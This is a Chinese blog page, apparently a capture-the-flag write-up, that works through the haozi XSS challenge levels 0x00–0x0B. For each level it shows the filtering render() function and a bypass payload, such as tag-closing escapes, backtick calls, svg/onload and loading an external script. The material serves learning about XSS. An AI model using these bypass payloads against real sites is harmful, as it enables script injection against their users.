@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="haozi XSS平台WriteUP0x00看源码，没有丝毫过滤 123function render (input) &amp;#123;  return &#39;&lt;div&gt;&#39; + input + &#39;&lt;&#x2F;div&gt;&#39;&amp;#125; 所以直接用最简单的payload 1&lt;script&gt;alert(1);&lt;&#x2F;script&gt;  0x01123function render">
+<meta property="og:type" content="article">
+<meta property="og:title" content="haozi XSS平台WriteUP">
+<meta property="og:url" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="haozi XSS平台WriteUP0x00看源码，没有丝毫过滤 123function render (input) &amp;#123;  return &#39;&lt;div&gt;&#39; + input + &#39;&lt;&#x2F;div&gt;&#39;&amp;#125; 所以直接用最简单的payload 1&lt;script&gt;alert(1);&lt;&#x2F;script&gt;  0x01123function render">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819058051939.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819060707376.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819062344640.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819065523077.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819068424204.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819073429551.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819080344556.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819083790690.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819086134155.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819093676548.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819095524326.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819101334275.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819103497985.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819108530746.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819109958799.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819111656542.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819113981888.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819117151830.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819116126560.jpg">
+<meta property="article:published_time" content="2020-03-21T09:13:50.985Z">
+<meta property="article:modified_time" content="2020-03-21T09:06:13.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/media/15819056904673/15819058051939.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>haozi XSS平台WriteUP · Zitui&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Zitui&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">haozi XSS平台WriteUP</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Zitui's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/image/sky.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            haozi XSS平台WriteUP
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.5k</span>Reading time: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/21</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="haozi-XSS平台WriteUP"><a href="#haozi-XSS平台WriteUP" class="headerlink" title="haozi XSS平台WriteUP"></a>haozi XSS平台WriteUP</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>看源码，没有丝毫过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以直接用最简单的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819058051939.jpg" alt="-w1116"></p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们看到，相比上一关，闭合的标签改变<br>将html代码段插入textarea， html代码段不会执行， 仅仅将其作为普通文本显示。<br>所以我们提前将textarea标签闭合即可<br>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1);&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819060707376.jpg" alt="-w1180"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前面用input标签，和上一道题思路相同，提前闭合input标签，让input逃逸。<br>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819062344640.jpg" alt="-w1175"></p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = /[()]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到存在过滤，（）将会被替换成空<br>所以我们alert()函数要进行替换<br>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`<span class="number">1</span>`;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819065523077.jpg" alt="-w1188"></p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = /[()`]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把上一关我们使用的反引号也进行了过滤<br>然后我们可以时候svg标签来执行实体代码<br>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;<span class="comment">#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819068424204.jpg" alt="-w1182"></p>
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  input = input.replace(/--&gt;/g, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们输入的input被放置在注释中，并且过滤掉了我们的注释符<br>我们需要知道<br>html注释支持以下两种方式：</p>
+<ul>
+<li>&lt;!– xxx – &gt;</li>
+<li>&lt;!- xxx -!&gt; &lt;!— 以！开头，以！结尾对称注释的方式 —!&gt;<br>所以我们采用第二种注释<br>payload：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<img src="media/15819056904673/15819073429551.jpg" alt="-w1198"></li>
+</ul>
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  input = input.replace(/auto|on.*=|&gt;/ig, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> `&lt;input value=<span class="number">1</span> $&#123;input&#125; type=<span class="string">"text"</span>&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将auto或者on开头，=结尾的标签属性并替换成_，并且忽略大小写，<br>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmousemove</span><br><span class="line">=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>不知道为啥没弹出来</p>
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将&lt;&gt;的标签进行替换<br>payload利用浏览器容错机制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">'alert(1)'</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819080344556.jpg" alt="-w1166"></p>
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(src)</span> </span>&#123;</span><br><span class="line">  src = src.replace(/&lt;\/style&gt;/ig, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> `</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤掉了我们的&lt; style&gt;标签，替换为/* \u574F\u4EBA */<br>绕过思路很简单，加个空格即可<br>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/style &gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819083790690.jpg" alt="-w1162"></p>
+<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  let domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> `&lt;script src=<span class="string">"$&#123;input&#125;"</span>&gt;&lt;/script&gt;`</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看代码可以看出来，要求以<a href="https://www.segmentfault.com" target="_blank" rel="noopener">https://www.segmentfault.com</a> 开头，所以我们尝试提前闭合<br>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.segmentfault.com"&gt;&lt;/script&gt;&lt;svg/onload=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819086134155.jpg" alt="-w1165"></p>
+<h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span><span class="params">(s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(/&amp;/g, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(/<span class="string">'/g, '</span>&amp;<span class="comment">#39;')</span></span><br><span class="line">            .replace(/<span class="string">"/g, '&amp;quot;')</span></span><br><span class="line"><span class="string">            .replace(/&lt;/g, '&amp;lt;')</span></span><br><span class="line"><span class="string">            .replace(/&gt;/g, '&amp;gt;')</span></span><br><span class="line"><span class="string">            .replace(/\//g, '&amp;#x2f')</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line"><span class="string">  if (domainRe.test(input)) &#123;</span></span><br><span class="line"><span class="string">    return `&lt;script src="</span>$&#123;escapeHtml(input)&#125;<span class="string">"&gt;&lt;/script&gt;`</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return 'Invalid URL'</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>转义了我们的很多标签，在本地应该很难实现XSS<br>但是我们注意，input在src标签内<br>我们可以尝试引入外部js<br>用题目给的js<br>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.segmentfault.com.haozi.me/j.js</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819093676548.jpg" alt="-w1164"></p>
+<h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>toUpperCase()函数将我们的input进行转大写操作，但是我们需要知道的是</p>
+<ul>
+<li>html标签大小写无影响；</li>
+<li>js严格区分大小写。</li>
+</ul>
+<p>所以我们可以用html实体编码绕过<br>payload</p>
